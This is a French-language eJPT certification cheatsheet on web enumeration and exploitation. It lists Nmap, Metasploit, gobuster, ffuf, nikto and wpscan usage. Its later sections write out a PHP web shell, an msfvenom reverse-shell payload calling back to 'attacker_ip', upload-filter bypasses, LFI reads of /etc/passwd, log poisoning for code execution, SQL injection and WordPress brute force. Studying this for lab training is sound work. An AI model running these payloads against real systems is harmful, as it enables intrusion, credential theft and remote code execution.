# 🌐 HTTP/HTTPS Web Enumeration - Cheatsheet eJPT

## 🔍 1. Scripts Nmap pour HTTP/HTTPS

### Scripts de découverte web
| Script | Description | Usage |
|--------|-------------|-------|
| `http-title` | Titre de la page | `nmap --script http-title target` |
| `http-headers` | Headers HTTP | `nmap --script http-headers target` |
| `http-methods` | Méthodes HTTP autorisées | `nmap --script http-methods target` |
| `http-robots.txt` | Fichier robots.txt | `nmap --script http-robots.txt target` |
| `http-sitemap-generator` | Génération sitemap | `nmap --script http-sitemap-generator target` |
| `http-enum` | Énumération générale | `nmap --script http-enum target` |
| `http-server-header` | Header serveur | `nmap --script http-server-header target` |
| `http-favicon` | Favicon et hash | `nmap --script http-favicon target` |

### Scripts de vulnérabilités web
| Script | CVE/Type | Description | Usage |
|--------|----------|-------------|-------|
| `http-shellshock` | CVE-2014-6271 | Shellshock Bash | `nmap --script http-shellshock target` |
| `http-slowloris-check` | DoS | Slowloris vulnerability | `nmap --script http-slowloris-check target` |
| `http-sql-injection` | SQLi | SQL injection detection | `nmap --script http-sql-injection target` |
| `http-stored-xss` | XSS | Stored XSS detection | `nmap --script http-stored-xss target` |
| `http-csrf` | CSRF | Cross-Site Request Forgery | `nmap --script http-csrf target` |
| `http-dombased-xss` | XSS | DOM-based XSS | `nmap --script http-dombased-xss target` |

### Scripts pour applications spécifiques
| Script | Application | Usage |
|--------|-------------|-------|
| `http-wordpress-enum` | WordPress | `nmap --script http-wordpress-enum target` |
| `http-wordpress-brute` | WordPress | `nmap --script http-wordpress-brute target` |
| `http-joomla-brute` | Joomla | `nmap --script http-joomla-brute target` |
| `http-drupal-enum` | Drupal | `nmap --script http-drupal-enum target` |
| `http-apache-negotiation` | Apache | `nmap --script http-apache-negotiation target` |
| `http-iis-webdav-vuln` | IIS WebDAV | `nmap --script http-iis-webdav-vuln target` |

### Commandes Nmap HTTP essentielles
```bash
# Énumération web complète
nmap -p80,443,8080,8000 --script http-* target

# Énumération de base (ESSENTIEL eJPT)
nmap -p80,443 --script http-title,http-headers,http-methods,http-robots.txt target

# Vulnérabilités web communes
nmap -p80,443 --script http-shellshock,http-sql-injection,http-stored-xss target

# Applications web populaires
nmap -p80,443 --script http-wordpress-enum,http-joomla-brute target

# Avec authentification
nmap --script http-enum --script-args http.useragent="Custom-Agent" target
```

---

## 🛠️ 2. Modules Metasploit pour HTTP/HTTPS

### Modules de scanning web
| Module | Description | Usage |
|--------|-------------|-------|
| `auxiliary/scanner/http/http_version` | Version serveur web | `use auxiliary/scanner/http/http_version` |
| `auxiliary/scanner/http/dir_scanner` | Énumération répertoires | `use auxiliary/scanner/http/dir_scanner` |
| `auxiliary/scanner/http/files_dir` | Fichiers et répertoires | `use auxiliary/scanner/http/files_dir` |
| `auxiliary/scanner/http/http_header` | Headers HTTP | `use auxiliary/scanner/http/http_header` |
| `auxiliary/scanner/http/robots_txt` | Fichier robots.txt | `use auxiliary/scanner/http/robots_txt` |
| `auxiliary/scanner/http/ssl_version` | Version SSL/TLS | `use auxiliary/scanner/http/ssl_version` |
| `auxiliary/scanner/http/backup_file` | Fichiers de backup | `use auxiliary/scanner/http/backup_file` |

### Modules pour applications spécifiques
| Module | Application | Usage |
|--------|-------------|-------|
| `auxiliary/scanner/http/wordpress_scanner` | WordPress | `use auxiliary/scanner/http/wordpress_scanner` |
| `auxiliary/scanner/http/wordpress_login_enum` | WordPress users | `use auxiliary/scanner/http/wordpress_login_enum` |
| `auxiliary/scanner/http/joomla_scanner` | Joomla | `use auxiliary/scanner/http/joomla_scanner` |
| `auxiliary/scanner/http/drupal_scanner` | Drupal | `use auxiliary/scanner/http/drupal_scanner` |
| `auxiliary/admin/http/tomcat_administration` | Tomcat | `use auxiliary/admin/http/tomcat_administration` |

### Modules d'exploitation web
| Module | Vulnérabilité | Usage |
|--------|---------------|-------|
| `exploit/multi/http/struts2_content_type_ognl` | Apache Struts2 | CVE-2017-5638 |
| `exploit/windows/http/rejetto_hfs_exec` | Rejetto HFS | Remote execution |
| `exploit/multi/http/php_cgi_arg_injection` | PHP CGI | Argument injection |
| `exploit/linux/http/pfsense_clickjacking` | pfSense | Clickjacking |

### Workflow Metasploit Web
```bash
msfconsole -q
workspace -a web_enum
setg RHOSTS target

# 1. Détection version serveur
use auxiliary/scanner/http/http_version
set RHOSTS target
run

# 2. Énumération répertoires
use auxiliary/scanner/http/dir_scanner
set RHOSTS target
set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
run

# 3. Headers et robots.txt
use auxiliary/scanner/http/http_header
run
use auxiliary/scanner/http/robots_txt
run

# 4. Si WordPress détecté
use auxiliary/scanner/http/wordpress_scanner
run
```

---

## 🔍 3. Outils d'énumération web essentiels

### Gobuster (Directory/File Brute Force)
```bash
# Énumération répertoires de base
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt

# Avec extensions
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js

# Mode récursif
gobuster dir -u http://target -w wordlist.txt -r

# Avec codes de statut spécifiques
gobuster dir -u http://target -w wordlist.txt -s 200,204,301,302,307,401,403

# Énumération sous-domaines
gobuster dns -d domain.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Options avancées
gobuster dir -u http://target -w wordlist.txt -t 50 -a "Custom-Agent" --timeout 10s
```

### Dirb (Directory Brute Force)
```bash
# Énumération basique
dirb http://target

# Avec wordlist personnalisée
dirb http://target /usr/share/wordlists/dirb/big.txt

# Avec extensions
dirb http://target -X .php,.html,.txt,.js

# Mode non-récursif
dirb http://target -r

# Avec cookies/headers
dirb http://target -H "Cookie: session=value"
dirb http://target -a "Custom User-Agent"
```

### Ffuf (Fuzzer web moderne)
```bash
# Directory fuzzing
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target/FUZZ

# File fuzzing avec extensions
ffuf -w wordlist.txt -u http://target/FUZZ -e .php,.html,.txt,.js

# Parameter fuzzing GET
ffuf -w params.txt -u http://target/page.php?FUZZ=test

# Parameter fuzzing POST
ffuf -w params.txt -X POST -d "FUZZ=test" -u http://target/login.php

# Subdomain fuzzing
ffuf -w subdomains.txt -u http://FUZZ.target.com

# Avec filtres
ffuf -w wordlist.txt -u http://target/FUZZ -fs 1234    # Filter size
ffuf -w wordlist.txt -u http://target/FUZZ -fc 404     # Filter codes
ffuf -w wordlist.txt -u http://target/FUZZ -fw 10      # Filter words
```

### Nikto (Scanner de vulnérabilités web)
```bash
# Scan basique
nikto -h http://target

# Avec port spécifique
nikto -h http://target:8080

# Mode verbose
nikto -h http://target -v

# Avec proxy
nikto -h http://target -useproxy http://proxy:8080

# Scan SSL
nikto -h https://target -ssl

# Format de sortie
nikto -h http://target -o nikto_results.txt
nikto -h http://target -Format xml -o nikto_results.xml
```

### WhatWeb (Identification technologie)
```bash
# Identification basique
whatweb target

# Mode agressif
whatweb -a 3 target

# Format JSON
whatweb --log-json=whatweb.json target

# Avec verbosité
whatweb -v target

# Scan de liste d'URLs
whatweb -i urls.txt
```

---

## 🔧 4. Outils spécialisés par CMS

### WordPress - WPScan
```bash
# Installation
gem install wpscan

# Scan basique
wpscan --url http://target

# Énumération utilisateurs
wpscan --url http://target --enumerate u

# Énumération plugins
wpscan --url http://target --enumerate p

# Énumération thèmes
wpscan --url http://target --enumerate t

# Énumération complète
wpscan --url http://target --enumerate u,p,t

# Brute force login
wpscan --url http://target --usernames admin --passwords passwords.txt

# Avec API token (recommandé)
wpscan --url http://target --api-token YOUR_API_TOKEN --enumerate u,p,t
```

### Joomla - JoomScan
```bash
# Installation
git clone https://github.com/rezasp/joomscan.git

# Scan Joomla
perl joomscan.pl -u http://target

# Énumération composants
perl joomscan.pl -u http://target -ec
```

### Drupal - Droopescan
```bash
# Installation
pip install droopescan

# Scan Drupal
droopescan scan drupal -u http://target

# Énumération plugins
droopescan scan drupal -u http://target --enumerate p

# Énumération thèmes
droopescan scan drupal -u http://target --enumerate t
```

---

## 🎯 5. Techniques d'énumération avancées

### Curl - Requests manuels
```bash
# Headers HTTP
curl -I http://target

# Méthodes HTTP
curl -X OPTIONS http://target

# Suivre redirections
curl -L http://target

# Avec User-Agent personnalisé
curl -A "Custom-Agent" http://target

# POST data
curl -X POST -d "param=value" http://target

# Avec cookies
curl -b "session=value" http://target

# Headers personnalisés
curl -H "Authorization: Bearer token" http://target

# Ignorer certificats SSL
curl -k https://target

# Download file
curl -O http://target/file.txt
```

### Burp Suite - Proxy interceptor
```bash
# Configuration proxy
# Proxy → Options → 127.0.0.1:8080

# Spider automatique
# Target → Site map → Right click → Spider this host

# Intruder pour brute force
# Intruder → Positions → Add payload positions
# Intruder → Payloads → Load wordlist

# Repeater pour tests manuels
# Right click request → Send to Repeater
```

---

## 🔍 6. Recherche de fichiers sensibles

### Fichiers de backup et sensibles
```bash
# Gobuster fichiers sensibles
gobuster dir -u http://target -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt

# Recherche de backups
gobuster dir -u http://target -w wordlist.txt -x .bak,.backup,.old,.orig,.save

# Fichiers de configuration
gobuster dir -u http://target -w wordlist.txt -x .conf,.config,.cfg,.ini

# Fichiers de log
gobuster dir -u http://target -w wordlist.txt -x .log,.txt

# Bases de données
gobuster dir -u http://target -w wordlist.txt -x .sql,.db,.sqlite
```

### Wordlists spécialisées web
```bash
# SecLists (essentielles)
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/big.txt

# Dirb wordlists
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirb/big.txt

# Fichiers sensibles
/usr/share/seclists/Discovery/Web-Content/raft-small-files.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
```

---

## 💥 7. Exploitation web commune eJPT

### Upload de shells web
```bash
# Créer shell PHP simple
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Shell PHP plus complexe
msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f raw > shell.php

# Upload via formulaire web
# Tester extensions: .php, .php3, .php4, .php5, .phtml, .pht

# Bypass filtres upload
# - Double extension: shell.php.jpg
# - Null byte: shell.php%00.jpg
# - MIME type: modifier Content-Type
```

### Local File Inclusion (LFI)
```bash
# Test LFI basique
curl "http://target/page.php?file=../../../etc/passwd"

# Avec null byte (PHP < 5.3)
curl "http://target/page.php?file=../../../etc/passwd%00"

# Log poisoning
curl "http://target/page.php?file=../../../var/log/apache2/access.log"

# Wrapper PHP
curl "http://target/page.php?file=php://filter/convert.base64-encode/resource=index.php"
```

### SQL Injection basique
```bash
# Test SQLi simple
curl "http://target/page.php?id=1'"
curl "http://target/page.php?id=1 OR 1=1"

# Union-based SQLi
curl "http://target/page.php?id=1 UNION SELECT 1,2,3,4"

# Avec sqlmap
sqlmap -u "http://target/page.php?id=1" --dbs
sqlmap -u "http://target/page.php?id=1" --tables -D database
sqlmap -u "http://target/page.php?id=1" --dump -T users -D database
```

---

## 🎯 8. Cas d'usage spécifiques eJPT

### Scénario 1: Application web avec upload
```bash
# 1. Énumération web
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -x php

# 2. Si upload trouvé
curl -F "file=@shell.php" http://target/upload.php

# 3. Handler Metasploit
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit

# 4. Accéder au shell
curl http://target/uploads/shell.php
```

### Scénario 2: WordPress avec credentials faibles
```bash
# 1. Découverte WordPress
wpscan --url http://target --enumerate u

# 2. Brute force admin
wpscan --url http://target --usernames admin --passwords passwords.txt

# 3. Si succès → Shell via plugin/theme editor
# Login → Appearance → Theme Editor → 404.php
# Ajouter: <?php system($_GET['cmd']); ?>

# 4. RCE
curl "http://target/wp-content/themes/theme/404.php?cmd=id"
```

### Scénario 3: Directory traversal + LFI
```bash
# 1. Découverte parameter
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://target/page.php?FUZZ=test

# 2. Test LFI
curl "http://target/page.php?file=../../../etc/passwd"

# 3. Si succès → Recherche logs/config
curl "http://target/page.php?file=../../../var/log/apache2/access.log"
curl "http://target/page.php?file=../../../etc/apache2/sites-enabled/000-default"

# 4. Log poisoning pour RCE
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
curl "http://target/page.php?file=../../../var/log/apache2/access.log&cmd=id"
```

---

## 💡 9. Conseils et astuces eJPT

### Workflow web recommandé pour eJPT
1. **Découverte** : `nmap -p80,443,8080 --script http-title,http-headers target`
2. **Énumération dirs** : `gobuster dir -u http://target -w common.txt -x php,html,txt`
3. **Identification tech** : `whatweb target` + `nikto -h http://target`
4. **Si CMS** → Outils spécialisés (wpscan, joomscan)
5. **Upload/LFI/SQLi** → Tests d'exploitation
6. **Shell upload** → Handler Metasploit

### Points critiques Web eJPT
- **Upload de fichiers = priorité #1** → Shell direct
- **WordPress très fréquent** → admin:admin, admin:password
- **LFI courant** dans les labs → /etc/passwd, log poisoning
- **Extensions multiples** à tester (.php, .html, .txt, .js)
- **Ports alternatifs** (8080, 8000, 3000, 5000)

### Erreurs courantes à éviter
- **Ne pas tester ports web alternatifs**
- **Oublier extensions** dans gobuster (-x php,html,txt)
- **Ignorer robots.txt** et headers
- **Ne pas identifier CMS** avant exploitation
- **Brute force sans énumération** préalable

### Extensions web importantes à fuzzer
```bash
# Extensions critiques eJPT
-x php,html,txt,js,css,xml,json,bak,old,orig,save

# Extensions par technologie
# PHP: .php,.php3,.php4,.php5,.phtml,.pht
# ASP: .asp,.aspx,.ashx,.asmx
# JSP: .jsp,.jspx,.do,.action
# Other: .cgi,.pl,.py,.rb
```

### One-liners web essentiels
```bash
# Discovery web complet
nmap -p80,443,8080 --script http-title,http-headers,http-robots.txt target && gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# Test upload rapide
curl -F "file=@shell.php" http://target/upload.php && curl http://target/uploads/shell.php

# WordPress quick check
curl -s http://target/wp-login.php | grep -i wordpress && wpscan --url http://target --enumerate u
```

### Wordlists par priorité eJPT
```bash
# 1. Premier scan (rapide)
/usr/share/wordlists/dirb/common.txt

# 2. Si peu de résultats (approfondir)
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

# 3. Fichiers sensibles
/usr/share/seclists/Discovery/Web-Content/raft-small-files.txt

# 4. Parameters web
/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

**🎯 Conseil final eJPT :** Les applications web sont LE point d'entrée principal dans l'eJPT. Pattern typique : découverte → gobuster avec extensions → identification CMS → exploitation upload/LFI/SQLi → shell. Upload de fichiers = victoire directe dans 70% des cas !